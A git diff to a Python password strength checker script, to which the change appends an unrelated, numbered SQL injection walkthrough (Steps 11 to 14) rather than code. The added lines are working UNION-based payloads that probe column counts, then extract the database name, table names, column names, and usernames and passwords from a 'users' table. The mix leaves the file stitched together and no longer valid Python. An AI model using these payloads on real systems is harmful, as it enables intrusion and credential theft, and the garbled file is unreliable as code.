@@ -43,6 +43,26 @@ while True:
     if password.lower() == "exit":
         print("Thank you for using the Password Strength Checker! Goodbye!")
         break
-
     result = check_password_strength(password)
     print(result)
+
+
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+Step 11: Extract Database Name
+1' UNION SELECT database(),2-- -
+
+Step 12: Extract Table Names
+1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema=database()-- -
+
+Step 13: Extract Column Names
+1' UNION SELECT column_name,2
+FROM information_schema.columns
+WHERE table_name='users'-- -
+
+Step 14: Extract Username & Password
+1' UNION SELECT user,password FROM users-- -
